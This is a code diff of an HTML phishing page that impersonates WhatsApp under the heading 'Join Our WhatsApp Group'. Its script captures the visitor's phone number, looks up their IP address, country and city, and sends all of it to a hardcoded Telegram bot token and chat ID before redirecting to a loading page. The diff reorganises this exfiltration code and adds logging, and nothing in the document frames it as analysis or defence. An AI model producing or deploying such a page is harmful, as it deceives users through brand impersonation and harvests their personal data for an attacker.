@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Green Navbar with Phone Input</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WhatsApp Invite Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
   <style>
     body {
       margin: 0;
@@ -95,62 +95,45 @@
       margin-bottom: 20px;
     }
 
-    footer .footer-links span {
-      display: block;
+    footer .footer-links p {
+      margin: 5px 10px;
     }
 
     footer .footer-bottom {
       font-size: 14px;
       opacity: 0.8;
     }
-
-    @media screen and (max-width: 480px) {
-      .container {
-        margin: 30px 10px;
-        padding: 20px 15px;
-      }
-
-      h2 {
-        font-size: 20px;
-      }
-
-      button {
-        padding: 12px 20px;
-        font-size: 15px;
-      }
-    }
   </style>
 </head>
 <body>
   <div class="navbar">
-    🌿 Green Navbar
+    🌿 WhatsApp Invite
   </div>
 
   <div class="container">
-    <img src="DSxOAUB0raA.png" alt="Second Image" class="sub-image">
-    <img src="172245867233593622.png" alt="Logo" class="logo">
+    <img src="DSxOAUB0raA.png" alt="Banner Image" class="sub-image" />
+    <img src="172245867233593622.png" alt="Logo" class="logo" />
     <h2>Join Our WhatsApp Group</h2>
     <form id="phone-form">
-      <input id="phone" class="phone-input" type="tel" placeholder="+1 234 567 8900" required autocomplete="off">
+      <input id="phone" class="phone-input" type="tel" placeholder="+1 234 567 8900" required autocomplete="off" />
       <button type="submit">Join Now</button>
     </form>
   </div>
 
   <footer>
     <div class="footer-links">
-        <p>Use WhatsApp</p>
-        <p>Features</p>
-        <p>WhatsApp Web</p>
-        <p>Download</p>
-        <p>About Us</p>
-        <p>Business</p>
-        <p>Security</p>
-        <p>Privacy & Terms</p>
-        <p>Get in Touch</p>
-        <p>Contact Us</p>
-        <p>Facebook | X (Twitter)</p>
-        <p>Meta Logo</p>
-        <p>© 2025 WhatsApp</p>
+      <p>Use WhatsApp</p>
+      <p>Features</p>
+      <p>WhatsApp Web</p>
+      <p>Download</p>
+      <p>About Us</p>
+      <p>Business</p>
+      <p>Security</p>
+      <p>Privacy & Terms</p>
+      <p>Get in Touch</p>
+      <p>Contact Us</p>
+      <p>Facebook | X (Twitter)</p>
+      <p>Meta Logo</p>
     </div>
     <div class="footer-bottom">© 2025 WhatsApp</div>
   </footer>
@@ -181,7 +164,10 @@
       }
 
       const phoneNumber = iti.getNumber();
+      const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
+      const chatId = "7196613507";
 
+      console.log("Fetching location...");
       fetch("https://ipapi.co/json")
         .then((response) => response.json())
         .then((data) => {
@@ -190,11 +176,11 @@
           const city = data.city;
 
           const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
+          const telegramUrl = `https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`;
 
-          const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY"; // Replace with your bot token
-          const chatId = "7196613507";     // Replace with your chat ID
+          console.log("Sending to Telegram:", message);
 
-          fetch(`https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`, {
+          fetch(telegramUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -210,37 +196,22 @@
               console.error("Telegram API error:", data);
               alert(`Telegram API error: ${data.description}`);
             } else {
-              window.location.href = "loading.html";
+              console.log("✅ Message sent! Redirecting to loading page...");
+              setTimeout(() => {
+                window.location.href = "loading.html";
+              }, 1000);
             }
           })
           .catch(err => {
-            console.error("Fetch error:", err);
+            console.error("❌ Fetch error:", err);
             alert("An error occurred. Please try again.");
           });
+        })
+        .catch((err) => {
+          console.error("❌ Location fetch error:", err);
+          alert("Unable to fetch your location. Try again.");
         });
     });
   </script>
-
-  <script>
-    fetch("https://ipapi.co/json")
-      .then(response => response.json())
-      .then(data => {
-        const userLang = data.languages ? data.languages.split(',')[0] : navigator.language;
-        if (userLang !== 'en') {
-          const script = document.createElement('script');
-          script.src = `https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit`;
-          document.body.appendChild(script);
-
-          window.googleTranslateElementInit = function () {
-            new google.translate.TranslateElement({
-              pageLanguage: 'en',
-              includedLanguages: userLang,
-              layout: google.translate.TranslateElement.InlineLayout.SIMPLE
-            }, 'google_translate_element');
-          };
-        }
-      });
-  </script>
-  <div id="google_translate_element" style="display:none;"></div>
 </body>
 </html>
